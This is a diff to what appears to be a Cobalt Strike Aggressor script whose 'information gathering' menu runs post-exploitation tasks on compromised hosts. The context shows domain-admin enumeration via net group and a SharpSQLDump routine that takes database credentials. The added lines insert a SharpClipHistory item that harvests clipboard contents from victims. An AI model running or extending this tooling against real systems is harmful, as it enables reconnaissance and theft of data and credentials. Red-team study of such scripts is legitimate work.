@@ -84,6 +84,7 @@ menu "信息收集" {
 				bshell($1, "net group \"domain admins\" /domain");
 			}
 		}
+
 				item "systeminfo" {
 			local('$bid');
 			foreach $bid ($1){
@@ -157,6 +158,9 @@ sub SharpCheckInfo {
 sub SharpSQLDump {
 		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
 		bexecute_assembly($bid, script_resource("/script/SharpSQLDump.exe"), $arg);
-}		
+}	
+		item "SharpClipHistory" {
+			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "");
+		}	
 			
 	}
